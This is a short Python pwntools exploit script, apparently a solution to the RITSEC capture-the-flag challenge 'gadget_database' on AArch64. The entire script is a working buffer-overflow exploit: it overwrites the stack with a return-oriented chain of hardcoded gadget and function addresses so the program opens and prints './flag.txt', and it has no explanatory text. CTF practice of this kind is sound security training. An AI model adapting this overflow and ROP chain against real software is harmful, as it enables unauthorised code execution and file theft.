from pwn import *

# p = remote("ctf.ritsec.club", 30865)
p = process(["qemu-aarch64-static", "-g", "1337", "./gadget_database"])
pause()

p.sendline(b'RS{REALFLAG}')

addr_open               = 0x41f210
addr_main_read_printf   = 0x40082c

gadget = 0x418b20   # mov x0, x20 ; ldp x19, x20, [sp, #0x10] ; ldp x21, x22, [sp, #0x20] ; ldp x29, x30, [sp], #0x30 ; ret  ; (4 found)

payload  = b'\0'*44
payload += p64(gadget)
payload += b'\0'*8
payload += p64(addr_open+8)
payload += b'\0'*40
payload += p64(addr_main_read_printf)
payload += b'\0'*(492-len(payload))
payload += b'./flag.txt\0'
p.sendline(payload)

p.interactive()
